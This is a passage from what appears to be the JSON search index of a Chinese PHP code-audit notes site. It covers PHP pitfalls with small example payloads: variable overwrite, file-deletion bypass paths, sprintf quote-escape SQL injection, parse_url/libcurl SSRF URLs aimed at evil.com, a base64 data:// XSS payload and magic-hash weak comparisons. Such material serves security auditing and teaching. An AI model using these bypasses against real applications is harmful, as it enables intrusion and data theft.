2147483647\u3002\u4e3e\u4f8b\uff0c\u5728\u8fd9\u6837\u7684\u7cfb\u7edf\u4e0a\uff0c intval('1000000000000') \u4f1a\u8fd4\u56de 2147483647\u300264 \u4f4d\u7cfb\u7edf\u4e0a\uff0c\u6700\u5927\u5e26\u7b26\u53f7\u7684 integer \u503c\u662f 9223372036854775807\u3002","title":"for\u5faa\u73af\u4e2d\u7684count"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc6/#_2","text":"\u6bd4\u5982\u4e0b\u6b21\u5728\u5ba1\u8ba1\u4e2d\uff0c\u53ef\u4ee5\u7559\u610f for \u5faa\u73af\u4e2d\u662f\u5426\u662f\u7528\u4e86 count \u8fd9\u79cd\u91cd\u65b0\u8ba1\u7b97\u7684\u51fd\u6570\uff0c\u5e76\u4e14\u5728\u5faa\u73af\u5185\u64cd\u4f5c\u4e86\u8fd9\u4e2a\u53d8\u91cf\u3002\u6709\u53ef\u80fd\u5bfc\u81f4\u65f6\u95f4\u76f2\u6ce8","title":"\u603b\u7ed3"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc6/#_3","text":"1 2 3 4 5 6 7 8 9 10 11 foreach($_REQUEST as $_k=>$_v) { if( strlen($_k)>0 && preg_match('/^(cfg_|GLOBALS)/',$_k) && !isset($_COOKIE[$_k]) ) { exit('Request var not allow!'); } } foreach(Array('_GET','_POST','_COOKIE') as $_request) { foreach($$_request as $_k => $_v) ${$_k} = $_v; } \u7a0d\u5fae\u7406\u89e3\u4e00\u4e0b\u4ee3\u7801\uff0c\u540e\u9762\u4e00\u4e2a foreach \u5faa\u73af\u5c31\u662f\u5bf9\u4e8e\u4e09\u4e2a\u6570\u7ec4\u53d6\u51fa\u6bcf\u4e2a\u5bf9\u5e94\u7684key\u548cvalue\uff0c\u5c06\u8fd9\u4e9bkey\u6ce8\u518c\u4e3a\u5168\u5c40\u7684\u53d8\u91cf \u63a7\u5236 $_GET \u4e3a _POST[GLOBALS][xixi] = 1; \u4e5f\u5c31\u662f $_GET[_POST[GLOBALS][xixi]]=1 \u5f53\u6267\u884c\u68c0\u6d4b\u65f6\uff0c\u7531\u4e8e $key \u662f _POST \uff0c\u6240\u4ee5\u4e0d\u4f1a\u88ab\u68c0\u6d4b\uff0c\u6b64\u65f6 post \u53c2\u6570\u662f\u7a7a\uff0c\u7136\u540e\u6267\u884c\u5230\u4e0b\u9762\u3002 \u6267\u884c foreach \u65f6\uff0c\u7b2c\u4e00\u6b21\u5faa\u73af\uff0c\u6b64\u65f6 $_request \u662f _GET \uff0c\u7136\u540e $_k \u662f _POST \uff0c\u6240\u4ee5\u662f ${_POST}['GLOBALS']['xixi'] = 1; \u7136\u540e\u6267\u884c\u5230\u7b2c\u4e8c\u6b21 foreach\uff0c\u6b64\u65f6 $_request \u4e3a _POST \uff0c $_k \u5c31\u662f\u6570\u7ec4\u7684\u952e\uff0c\u81ea\u7136\u5c31\u662f GLOBALS \uff0c\u6240\u4ee5\u6267\u884c\u7684\u5c31\u662f ${GLOBALS}['xixi']=1 \u8fd9\u6837\u5c31\u8986\u76d6\u4e86 $GLOBALS \u4e86\u3002\u3002","title":"\u5168\u5c40\u53d8\u91cf\u8986\u76d6"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc6/#_4","text":"https://www.freebuf.com/vuls/207026.html https://xz.aliyun.com/t/5676","title":"\u53c2\u8003"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/","text":"file_put_contents\u3001copy\u3001file_get_contents\u7b49\u8bfb\u53d6\u5199\u5165\u64cd\u4f5c\u4e0eunlink\u3001file_exists\u7b49\u5220\u9664\u5224\u65ad\u6587\u4ef6\u51fd\u6570\u4e4b\u95f4\u5bf9\u4e8e\u8def\u5f84\u5904\u7406\u7684\u5dee\u5f02\u5bfc\u81f4\u7684\u5220\u9664\u7ed5\u8fc7 \u00b6 1 2 3 4 5 6 7 8 9 <?php $filename = __DIR__ . '/tmp/' . $user [ 'name' ]; $data = $user [ 'info' ]; file_put_contents ( $filename , $data ); if ( file_exists ( $filename )) { unlink ( $filename ); } ?> \u67e5\u770bphp\u6e90\u7801\uff0c\u5176\u5b9e\u6211\u4eec\u80fd\u53d1\u73b0\uff0cphp\u8bfb\u53d6\u3001\u5199\u5165\u6587\u4ef6\uff0c\u90fd\u4f1a\u8c03\u7528php_stream_open_wrapper_ex\u6765\u6253\u5f00\u6d41\uff0c\u800c\u5224\u65ad\u6587\u4ef6\u5b58\u5728\u3001\u91cd\u547d\u540d\u3001\u5220\u9664\u6587\u4ef6\u7b49\u64cd\u4f5c\u5219\u65e0\u9700\u6253\u5f00\u6587\u4ef6\u6d41\u3002 \u6211\u4eec\u8ddf\u4e00\u8ddfphp_stream_open_wrapper_ex\u5c31\u4f1a\u53d1\u73b0\uff0c\u5176\u5b9e\u6700\u540e\u4f1a\u4f7f\u7528tsrm_realpath\u51fd\u6570\u6765\u5c06filename\u7ed9\u6807\u51c6\u5316\u6210\u4e00\u4e2a\u7edd\u5bf9\u8def\u5f84\u3002\u800c\u6587\u4ef6\u5220\u9664\u7b49\u64cd\u4f5c\u5219\u4e0d\u4f1a\uff0c\u8fd9\u5c31\u662f\u4e8c\u8005\u7684\u533a\u522b\u3002 \u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u4f20\u5165\u7684\u662f\u6587\u4ef6\u540d\u4e2d\u5305\u542b\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u8def\u5f84\uff0c\u5199\u5165\u7684\u65f6\u5019\u56e0\u4e3a\u4f1a\u5904\u7406\u6389\u201c../\u201d\u7b49\u76f8\u5bf9\u8def\u5f84\uff0c\u6240\u4ee5\u4e0d\u4f1a\u51fa\u9519\uff1b\u5224\u65ad\u3001\u5220\u9664\u7684\u65f6\u5019\u56e0\u4e3a\u4e0d\u4f1a\u5904\u7406\uff0c\u6240\u4ee5\u5c31\u4f1a\u51fa\u73b0\u201cNo such file or directory\u201d\u7684\u9519\u8bef\u3002 \u4e8e\u662f\u4e4elinux\u53ef\u4ee5\u901a\u8fc7 xxxxx/../test.php \u3001 test.php/. windows\u53ef\u4ee5\u901a\u8fc7 test.php:test test.ph< \u6765\u7ed5\u8fc7\u6587\u4ef6\u5220\u9664 \u6b64\u5916\u53d1\u73b0\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4f2a\u534f\u8bae php://filter/resource=1.php \u5728file_ge_contents\u3001copy\u7b49\u4e2d\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\uff0c\u5374\u53ef\u4ee5\u7ed5\u8fc7\u6587\u4ef6\u5220\u9664 extract()\u3001parse_str() \u7b49\u53d8\u91cf\u8986\u76d6 \u00b6 extract\u51fd\u6570\u4ece\u6570\u7ec4\u5bfc\u5165\u53d8\u91cf\uff08 $_GET \u3001 $_POST \uff09,\u5c06\u6570\u7ec4\u7684\u952e\u540d\u4f5c\u4e3a\u53d8\u91cf\u7684\u503c\u3002\u800cparse_str\u51fd\u6570\u5219\u662f\u4ece\u7c7b\u4f3cname=Bill&age=60\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u89e3\u6790\u53d8\u91cf.\u5982\u679c\u5728\u4f7f\u7528\u7b2c\u4e00\u4e2a\u51fd\u6570\u6ca1\u6709\u8bbe\u7f6e EXTR_SKIP \u6216\u8005 EXTR_PREFIX_SAME \u7b49\u5904\u7406\u53d8\u91cf\u51b2\u7a81\u7684\u53c2\u6570\u65f6\u3001\u7b2c\u4e8c\u4e2a\u51fd\u6570\u6ca1\u6709\u4f7f\u7528\u6570\u7ec4\u63a5\u53d7\u53d8\u91cf\u65f6\u5c06\u4f1a\u5bfc\u81f4\u53d8\u91cf\u8986\u76d6\u7684\u95ee\u9898 intval()\u6574\u6570\u6ea2\u51fa\u3001\u5411\u4e0b\u53d6\u6574\u548c\u6574\u5f62\u5224\u65ad\u7684\u95ee\u9898 \u00b6 32\u4f4d\u7cfb\u7edf\u6700\u5927\u7684\u5e26\u7b26\u53f7\u8303\u56f4\u4e3a-2147483648 \u5230 2147483647\uff0c64\u4f4d\u6700\u5927\u7684\u662f 9223372036854775807\uff0c\u56e0\u6b64\uff0c\u572832\u4f4d\u7cfb\u7edf\u4e0a intval(\u20181000000000000\u2019) \u4f1a\u8fd4\u56de 2147483647 \u6b64\u5916intval(10.99999)\u4f1a\u8fd4\u56de10\uff0cintval\u548cint\u7b49\u53d6\u6574\u90fd\u662f\u2019\u622a\u65ad\u2019\u53d6\u6574\uff0c\u5e76\u4e0d\u662f\u56db\u820d\u4e94\u5165 intval\u51fd\u6570\u8fdb\u53bb\u53d6\u6574\u65f6\uff0c\u662f\u76f4\u5230\u9047\u4e0a\u6570\u5b57\u6216\u8005\u6b63\u8d1f\u53f7\u624d\u5f00\u59cb\u8fdb\u884c\u8f6c\u6362\uff0c\u4e4b\u540e\u5728\u9047\u5230\u975e\u6570\u5b57\u6216\u8005\u7ed3\u675f\u7b26\u53f7\uff08\\0\uff09\u65f6\u7ed3\u675f\u8f6c\u6362 \u6d6e\u70b9\u6570\u7cbe\u5ea6\u95ee\u9898\u5bfc\u81f4\u7684\u5927\u5c0f\u6bd4\u8f83\u95ee\u9898 \u00b6 \u5f53\u5c0f\u6570\u5c0f\u4e8e10^-16\u540e\uff0cPHP\u5bf9\u4e8e\u5c0f\u6570\u5c31\u5927\u5c0f\u4e0d\u5206\u4e86 var_dump(1.000000000000000 == 1) >> TRUE var_dump(1.0000000000000001 == 1) >> TRUE is_numeric()\u4e0eintval()\u7279\u6027\u5dee\u5f02 \u00b6 is_numeric\u51fd\u6570\u5728\u5224\u65ad\u662f\u5426\u662f\u6570\u5b57\u65f6\u4f1a\u5ffd\u7565\u5b57\u7b26\u4e32\u5f00\u5934\u7684\u2019 \u2018\u3001\u2019\\t\u2019\u3001\u2019\\n\u2019\u3001\u2019\\r\u2019\u3001\u2019\\v\u2019\u3001\u2019\\f\u2019\u3002\u800c\u2019.\u2019\u53ef\u4ee5\u51fa\u73b0\u5728\u4efb\u610f\u4f4d\u7f6e\uff0cE\u3001e\u80fd\u51fa\u73b0\u5728\u53c2\u6570\u4e2d\u95f4\uff0c\u4ecd\u53ef\u4ee5\u88ab\u5224\u65ad\u4e3a\u6570\u5b57\u3002\u4e5f\u5c31\u662f\u8bf4is_numeric(\u201c\\r\\n\\t 0.1e2\u201d) >> TRUE intval()\u51fd\u6570\u4f1a\u5ffd\u7565\u2019\u2019 \u2018\\n\u2019\u3001\u2019\\r\u2019\u3001\u2019\\t\u2019\u3001\u2019\\v\u2019\u3001\u2019\\0\u2019 \uff0c\u4e5f\u5c31\u662f\u8bf4intval(\u201c\\r\\n\\t 12\u201d) >> 12 strcmp()\u6570\u7ec4\u6bd4\u8f83\u7ed5\u8fc7 \u00b6 int strcmp ( string $str1,string $str2 ) \u53c2\u6570 str1\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002str2\u7b2c\u4e8c\u4e2a\u5b57\u7b26\u4e32\u3002\u5982\u679c str1 \u5c0f\u4e8e str2 \u8fd4\u56de < 0\uff1b \u5982\u679c str1 \u5927\u4e8e str2 \u8fd4\u56de > 0\uff1b\u5982\u679c\u4e24\u8005\u76f8\u7b49\uff0c\u8fd4\u56de 0\u3002 \u4f46\u662f\u5982\u679c\u4f20\u5165\u7684 \u4e24\u4e2a\u53d8\u91cf\u662f\u6570\u7ec4\u7684\u8bdd\uff0c\u51fd\u6570\u4f1a\u62a5\u9519\u8fd4\u56deNULL \uff0c\u5982\u679c\u53ea\u662f\u7528strcmp()==0\u6765\u5224\u65ad\u7684\u8bdd\u5c31\u53ef\u4ee5\u7ed5\u8fc7 sha1()\u3001md5() \u51fd\u6570\u4f20\u5165\u6570\u7ec4\u6bd4\u8f83\u7ed5\u8fc7 \u00b6 sha1\uff08\uff09 MD5\uff08\uff09\u51fd\u6570\u9ed8\u8ba4\u63a5\u6536\u7684\u53c2\u6570\u662f\u5b57\u7b26\u4e32\u7c7b\u578b\uff0c\u4f46\u662f\u5982\u679c\u5982\u679c \u4f20\u5165\u7684\u53c2\u6570\u662f\u6570\u7ec4\u7684\u8bdd\uff0c\u51fd\u6570\u5c31\u4f1a\u62a5\u9519\u8fd4\u56deNULL \u7c7b\u4f3c sha1(GET[\u2018name\u2032])===sha1(GET[\u2018name\u2032])===sha1(_GET[\u2018password\u2019]) \u7684\u6bd4\u8f83\u5c31\u53ef\u4ee5\u7ed5\u8fc7 eregi()\u5339\u914d\u7ed5\u8fc7 \u00b6 eregi\uff08\uff09\u9ed8\u8ba4\u63a5\u6536\u5b57\u7b26\u4e32\u53c2\u6570\uff0c\u5982\u679c\u4f20\u5165\u6570\u7ec4\uff0c\u51fd\u6570\u4f1a\u62a5\u9519\u5e76\u8fd4\u56deNULL\u3002\u540c\u65f6\u8fd8\u53ef\u4ee5%00 \u622a\u65ad\u8fdb\u884c\u7ed5\u8fc7 PHP\u53d8\u91cf\u540d\u4e0d\u80fd\u5e26\u6709\u70b9[.] \u548c\u7a7a\u683c\uff0c\u5426\u5219\u5728\u4f1a\u88ab\u8f6c\u5316\u4e3a\u4e0b\u5212\u7ebf[_] \u00b6 1 2 3 4 5 6 7 8 parse_str(\"na.me=admin&pass wd=123\",$test); var_dump($test); array(2) { [\"na_me\"]=> string(5) \"admin\" [\"pass_wd\"]=> string(3) \"123\" in_arrary()\u51fd\u6570\u9ed8\u8ba4\u8fdb\u884c\u677e\u6563\u6bd4\u8f83\uff08\u8fdb\u884c\u7c7b\u578b\u8f6c\u6362\uff09 \u00b6 1 2 in_arrary(\"1asd\",arrart(1,2,3,4)) => true in_arrary(\"1asd\",arrart(1,2,3,4),TRUE) => false \\\\(\u9700\u8981\u8bbe\u7f6estrict\u53c2\u6570\u4e3atrue\u624d\u4f1a\u8fdb\u884c\u4e25\u683c\u6bd4\u8f83\uff0c\u8fdb\u884c\u7c7b\u578b\u68c0\u6d4b) htmlspecialchars()\u51fd\u6570\u9ed8\u8ba4\u53ea\u8f6c\u4e49\u53cc\u5f15\u53f7\u4e0d\u8f6c\u4e49\u5355\u5f15\u53f7\uff0c\u5982\u679c\u90fd\u8f6c\u4e49\u7684\u8bdd\u9700\u8981\u6dfb\u52a0\u4e0a\u53c2\u6570ENT_QUOTES \u00b6 \u5728 php4\u3001php<5.2.1 \u4e2d\uff0c\u53d8\u91cf\u7684key\u503c\u4e0d\u53d7magic_quotes_gpc\u5f71\u54cd \u00b6 sprintf()\u683c\u5f0f\u5316\u6f0f\u6d1e\uff08\u53ef\u4ee5\u5403\u6389\u8f6c\u4e49\u540e\u7684\u5355\u5f15\u53f7 \u00b6 printf\uff08\uff09\u548csprintf\uff08\uff09\u51fd\u6570\u4e2d\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528%\u63a5\u4e00\u4e2a\u5b57\u7b26\u6765\u8fdb\u884cpadding\u529f\u80fd \u4f8b\u5982%10s \u5b57\u7b26\u4e32\u4f1a\u9ed8\u8ba4\u5728\u5de6\u4fa7\u586b\u5145\u7a7a\u683c\u81f3\u957f\u5ea6\u4e3a10\uff0c\u8fd8\u53ef\u4ee5 %010s \u4f1a\u4f7f\u7528\u5b57\u7b260\u8fdb\u884c\u586b\u5145\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u60f3\u8981\u4f7f\u7528\u522b\u7684\u5b57\u7b26\u8fdb\u884c\u586b\u5145\uff0c\u9700\u8981\u4f7f\u7528 \u2018 \u5355\u5f15\u53f7\u8fdb\u884c\u6807\u8bc6\uff0c\u4f8b\u5982 %\u2019#10s \u8fd9\u4e2a\u5c31\u662f\u4f7f\u7528#\u8fdb\u884c\u586b\u5145\uff08\u767e\u5206\u53f7\u4e0d\u4ec5\u4f1a\u5403\u6389\u2019\u5355\u5f15\u53f7\uff0c\u8fd8\u4f1a\u5403\u6389 \u659c\u6760\uff09 \u540c\u65f6sprintf\uff08\uff09\u53ef\u4ee5\u4f7f\u7528\u6307\u5b9a\u53c2\u6570\u4f4d\u7f6e\u7684\u5199\u6cd5 %\u540e\u9762\u7684\u6570\u5b57\u4ee3\u8868\u7b2c\u51e0\u4e2a\u53c2\u6570\uff0c$\u540e\u4ee3\u8868\u683c\u5f0f\u5316\u7c7b\u578b \u8f93\u5165\u7684\u7279\u6b8a\u5b57\u7b26\u88ab\u653e\u5230\u5f15\u53f7\u4e2d\u8fdb\u884c\u8f6c\u4e49\u65f6\uff0c\u4f46\u662f\u53c8\u4f7f\u7528\u4e86sprintf\u51fd\u6570\u8fdb\u884c\u62fc\u63a5\u65f6 \u4f8b\u5982 %1$'%s' \u4e2d\u7684 '% \u88ab\u5f53\u6210\u4f7f\u7528 % \u8fdb\u884cpadding\uff0c\u5bfc\u81f4\u540e\u4e00\u4e2a ' \u9003\u9038\u4e86 \u8fd8\u6709\u4e00\u79cd\u60c5\u51b5\u5c31\u662f ' \u88ab\u8f6c\u4e49\u6210\u4e86 \\' ,\u4f8b\u5982\u8f93\u5165 %'and 1=1# \u8fdb\u5165\uff0c\u5b58\u5728SQL\u8fc7\u6ee4\uff0c ' \u88ab\u8f6c\u6210\u4e86 \\' \u4e8e\u662fsql\u8bed\u53e5\u53d8\u6210\u4e86 select * from user where username = '%\\' and 1=1#'; \u5982\u679c\u8fd9\u4e2a\u8bed\u53e5\u88ab\u4f7f\u7528sprintf\u51fd\u6570\u8fdb\u884c\u4e86\u62fc\u63a5\uff0c % \u540e\u7684 \\ \u88ab\u5403\u6389\u4e86\uff0c\u5bfc\u81f4\u4e86 \u2019 \u9003\u9038 1 2 3 4 5 6 <?php $sql = \"select * from user where username = '%\\' and 1=1#';\" ; $args = \"admin\" ; echo sprintf ( $sql , $args ) ; //result: select * from user where username = '' and 1=1#' ?> \u4e0d\u8fc7\u8fd9\u6837\u5bb9\u6613\u9047\u5230 PHP Warning: sprintf(): Too few arguments \u7684\u62a5\u9519 \u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 %1$ \u6765\u5403\u6389\u8f6c\u79fb\u6dfb\u52a0\u7684 \\ 1 2 3 4 5 6 <?php $sql = \"select * from user where username = '%1 $\\ ' and 1=1#' and password='%s';\" ; $args = \"admin\" ; echo sprintf ( $sql , $args ) ; //result: select * from user where username = '' and 1=1#' and password='admin'; ?> php\u4e2d = \u8d4b\u503c\u8fd0\u7b97\u7684\u4f18\u5148\u7ea7\u9ad8\u4e8eand \u00b6 $c = is_numeric($a) and is_numeric($b) \u7a0b\u5e8f\u672c\u610f\u662f\u8981a\u3001b\u90fd\u4e3a\u6570\u5b57\u624d\u4f1a\u7ee7\u7eed\uff0c\u4f46\u662f\u5f53a\u4e3a\u6570\u5b57\u65f6\uff0c\u4f1a\u5148\u8d4b\u503c\u7ed9a\u4e3a\u6570\u5b57\u65f6\uff0c\u4f1a\u5148\u8d4b\u503c\u7ed9c\uff0c\u6240\u4ee5\u53ef\u80fd\u5bfc\u81f4$b\u7ed5\u8fc7\u68c0\u6d4b parse_url\u4e0elibcurl\u5bf9\u4e0eurl\u7684\u89e3\u6790\u5dee\u5f02\u53ef\u80fd\u5bfc\u81f4ssrf \u00b6 \u5f53url\u4e2d\u6709\u591a\u4e2a@\u7b26\u53f7\u65f6\uff0c parse_url\u4e2d\u83b7\u53d6\u7684host\u662f\u6700\u540e\u4e00\u4e2a@\u7b26\u53f7\u540e\u9762\u7684host\uff0c\u800clibcurl\u5219\u662f\u83b7\u53d6\u7684\u7b2c\u4e00\u4e2a@\u7b26\u53f7\u4e4b\u540e\u7684\u3002 \u56e0\u6b64\u5f53\u4ee3\u7801\u5bf9 http://user@eval.com:80@baidu.com \u8fdb\u884c\u89e3\u6790\u65f6\uff0cPHP\u83b7\u53d6\u7684host\u662fbaidu.com\u662f\u5141\u8bb8\u8bbf\u95ee\u7684\u57df\u540d\uff0c\u800c\u6700\u540e\u8c03\u7528libcurl\u8fdb\u884c\u8bf7\u6c42\u65f6\u5219\u662f\u8bf7\u6c42\u7684eval.com\u57df\u540d\uff0c\u53ef\u4ee5\u9020\u6210ssrf\u7ed5\u8fc7 \u6b64\u5916\u5bf9\u4e8e https://evil@baidu.com \u8fd9\u6837\u7684\u57df\u540d\u8fdb\u884c\u89e3\u6790\u65f6,php\u83b7\u53d6\u7684host\u662f evil@baidu.com \uff0c\u4f46\u662flibcurl\u83b7\u53d6\u7684host\u5374\u662fevil.com url\u6807\u51c6\u7684\u7075\u6d3b\u6027\u5bfc\u81f4\u7ed5\u8fc7filter_var\u4e0eparse_url\u8fdb\u884cssrf \u00b6 filter_var()\u51fd\u6570\u5bf9\u4e8e http://evil.com;google.com \u4f1a\u8fd4\u56defalse\u4e5f\u5c31\u662f\u8ba4\u4e3aurl\u683c\u5f0f\u9519\u8bef\uff0c\u4f46\u662f\u5bf9\u4e8e 0://evil.com:80;google.com:80/ \u3001 0://evil.com:80,google.com:80/ \u3001 0://evil.com:80\\google.com:80/ \u5374\u8fd4\u56detrue. \u901a\u8fc7file_get_contents\u83b7\u53d6\u7f51\u9875\u5185\u5bb9\u5e76\u8fd4\u56de\u5230\u5ba2\u6237\u7aef\u6709\u53ef\u80fd\u9020\u6210xss \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 if(filter_var($argv[1], FILTER_VALIDATE_URL)) { // parse URL $r = parse_url($argv[1]); print_r($r); // check if host ends with google.com if(preg_match('/baidu\\.com$/', $r['host'])) { // get page from URL $a = file_get_contents($argv[1]); echo($a); } else { echo \"Error: Host not allowed\"; } } else { echo \"Error: Invalid URL\"; } \u867d\u7136\u901a\u8fc7filter_var\u51fd\u6570\u5bf9url\u7684\u683c\u5f0f\u8fdb\u884c\u68c0\u67e5\uff0c\u5e76\u4e14\u4f7f\u7528\u6b63\u5219\u5bf9url\u7684host\u8fdb\u884c\u9650\u5b9a \u4f46\u662f\u53ef\u4ee5\u901a\u8fc7 data://baidu.com/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo= \u9875\u9762\u4f1a\u5c06 <script>alert(1)</script> \u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\uff0c\u5c31\u6709\u53ef\u80fd\u9020\u6210xss \u5f31\u7c7b\u578b \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 md5(\u2018240610708\u2019); // 0e462097431906509019562988736854 md5(\u2018QNKCDZO\u2019); // 0e830400451993494058024219903391 md5(\u2018240610708\u2019) == md5(\u2018QNKCDZO\u2019) md5(\u2018aabg7XSs\u2019) == md5(\u2018aabC9RqS\u2019) sha1(\u2018aaroZmOk\u2019) == sha1(\u2018aaK1STfY\u2019) sha1(\u2018aaO8zKZF\u2019) == sha1(\u2018aa3OFF9m\u2019) \u20180010e2\u2019 == \u20181e3\u2019 \u20180x1234Ab\u2019 == \u20181193131\u2018 \u20180xABCdef\u2019 == \u2018 0xABCdef\u2019 \u5f53\u8f6c\u6362\u4e3aboolean\u65f6\uff0c\u4ee5\u4e0b\u53ea\u88ab\u8ba4\u4e3a\u662fFALSE\uff1aFALSE\u30010\u30010.0\u3001\u201c\u201d\u3001\u201c0\u201d\u3001array()\u3001NULL 1 2 3 PHP 7 \u4ee5\u524d\u7684\u7248\u672c\u91cc\uff0c\u5982\u679c\u5411\u516b\u8fdb\u5236\u6570\u4f20\u9012\u4e86\u4e00\u4e2a\u975e\u6cd5\u6570\u5b57\uff08\u5373 8 \u6216 9\uff09\uff0c\u5219\u540e\u9762\u5176\u4f59\u6570\u5b57\u4f1a\u88ab\u5ffd\u7565\u3002var_dump(0123)=var_dump(01239)=83 PHP 7 \u4ee5\u540e\uff0c\u4f1a\u4ea7\u751f Parse Error\u3002 1 2 3 4 5 6 7 \u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u6570\u503c\u65f6\uff0c\u82e5\u5b57\u7b26\u4e32\u5f00\u5934\u6709\u6570\u5b57\uff0c\u5219\u8f6c\u4e3a\u6570\u5b57\u5e76\u7701\u7565\u540e\u9762\u7684\u975e\u6570\u5b57\u5b57\u7b26\u3002\u82e5\u4e00\u5f00\u5934\u6ca1\u6709\u6570\u5b57\u5219\u8f6c\u6362\u4e3a0 \\$foo = 1 + \u201cbob-1.3e3\u201d; // $foo is integer (1) \\$foo = 1 + \u201cbob3\u201d; // $foo is integer (1) \\$foo = 1 + \u201c10 Small Pigs\u201d; // $foo is integer (11) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u2018\u2019 == 0 == false \u2018123\u2019 == 123 \u2018abc\u2019 == 0 \u2018123a\u2019 == 123 \u20180x01\u2019 == 1 \u20180e123456789\u2019 == \u20180e987654321\u2019 [false] == [0] == [NULL] == [\u2018\u2019] NULL == false == 0\u00bb true == 1","title":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc61"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#file_put_contentscopyfile_get_contentsunlinkfile_exists","text":"1 2 3 4 5 6 7 8 9 <?php $filename = __DIR__ . '/tmp/' . $user [ 'name' ]; $data = $user [ 'info' ]; file_put_contents ( $filename , $data ); if ( file_exists ( $filename )) { unlink ( $filename ); } ?> \u67e5\u770bphp\u6e90\u7801\uff0c\u5176\u5b9e\u6211\u4eec\u80fd\u53d1\u73b0\uff0cphp\u8bfb\u53d6\u3001\u5199\u5165\u6587\u4ef6\uff0c\u90fd\u4f1a\u8c03\u7528php_stream_open_wrapper_ex\u6765\u6253\u5f00\u6d41\uff0c\u800c\u5224\u65ad\u6587\u4ef6\u5b58\u5728\u3001\u91cd\u547d\u540d\u3001\u5220\u9664\u6587\u4ef6\u7b49\u64cd\u4f5c\u5219\u65e0\u9700\u6253\u5f00\u6587\u4ef6\u6d41\u3002 \u6211\u4eec\u8ddf\u4e00\u8ddfphp_stream_open_wrapper_ex\u5c31\u4f1a\u53d1\u73b0\uff0c\u5176\u5b9e\u6700\u540e\u4f1a\u4f7f\u7528tsrm_realpath\u51fd\u6570\u6765\u5c06filename\u7ed9\u6807\u51c6\u5316\u6210\u4e00\u4e2a\u7edd\u5bf9\u8def\u5f84\u3002\u800c\u6587\u4ef6\u5220\u9664\u7b49\u64cd\u4f5c\u5219\u4e0d\u4f1a\uff0c\u8fd9\u5c31\u662f\u4e8c\u8005\u7684\u533a\u522b\u3002 \u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u4f20\u5165\u7684\u662f\u6587\u4ef6\u540d\u4e2d\u5305\u542b\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u8def\u5f84\uff0c\u5199\u5165\u7684\u65f6\u5019\u56e0\u4e3a\u4f1a\u5904\u7406\u6389\u201c../\u201d\u7b49\u76f8\u5bf9\u8def\u5f84\uff0c\u6240\u4ee5\u4e0d\u4f1a\u51fa\u9519\uff1b\u5224\u65ad\u3001\u5220\u9664\u7684\u65f6\u5019\u56e0\u4e3a\u4e0d\u4f1a\u5904\u7406\uff0c\u6240\u4ee5\u5c31\u4f1a\u51fa\u73b0\u201cNo such file or directory\u201d\u7684\u9519\u8bef\u3002 \u4e8e\u662f\u4e4elinux\u53ef\u4ee5\u901a\u8fc7 xxxxx/../test.php \u3001 test.php/. windows\u53ef\u4ee5\u901a\u8fc7 test.php:test test.ph< \u6765\u7ed5\u8fc7\u6587\u4ef6\u5220\u9664 \u6b64\u5916\u53d1\u73b0\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4f2a\u534f\u8bae php://filter/resource=1.php \u5728file_ge_contents\u3001copy\u7b49\u4e2d\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\uff0c\u5374\u53ef\u4ee5\u7ed5\u8fc7\u6587\u4ef6\u5220\u9664","title":"file_put_contents\u3001copy\u3001file_get_contents\u7b49\u8bfb\u53d6\u5199\u5165\u64cd\u4f5c\u4e0eunlink\u3001file_exists\u7b49\u5220\u9664\u5224\u65ad\u6587\u4ef6\u51fd\u6570\u4e4b\u95f4\u5bf9\u4e8e\u8def\u5f84\u5904\u7406\u7684\u5dee\u5f02\u5bfc\u81f4\u7684\u5220\u9664\u7ed5\u8fc7"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#extractparse_str","text":"extract\u51fd\u6570\u4ece\u6570\u7ec4\u5bfc\u5165\u53d8\u91cf\uff08 $_GET \u3001 $_POST \uff09,\u5c06\u6570\u7ec4\u7684\u952e\u540d\u4f5c\u4e3a\u53d8\u91cf\u7684\u503c\u3002\u800cparse_str\u51fd\u6570\u5219\u662f\u4ece\u7c7b\u4f3cname=Bill&age=60\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u89e3\u6790\u53d8\u91cf.\u5982\u679c\u5728\u4f7f\u7528\u7b2c\u4e00\u4e2a\u51fd\u6570\u6ca1\u6709\u8bbe\u7f6e EXTR_SKIP \u6216\u8005 EXTR_PREFIX_SAME \u7b49\u5904\u7406\u53d8\u91cf\u51b2\u7a81\u7684\u53c2\u6570\u65f6\u3001\u7b2c\u4e8c\u4e2a\u51fd\u6570\u6ca1\u6709\u4f7f\u7528\u6570\u7ec4\u63a5\u53d7\u53d8\u91cf\u65f6\u5c06\u4f1a\u5bfc\u81f4\u53d8\u91cf\u8986\u76d6\u7684\u95ee\u9898","title":"extract()\u3001parse_str() \u7b49\u53d8\u91cf\u8986\u76d6"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#intval","text":"32\u4f4d\u7cfb\u7edf\u6700\u5927\u7684\u5e26\u7b26\u53f7\u8303\u56f4\u4e3a-2147483648 \u5230 2147483647\uff0c64\u4f4d\u6700\u5927\u7684\u662f 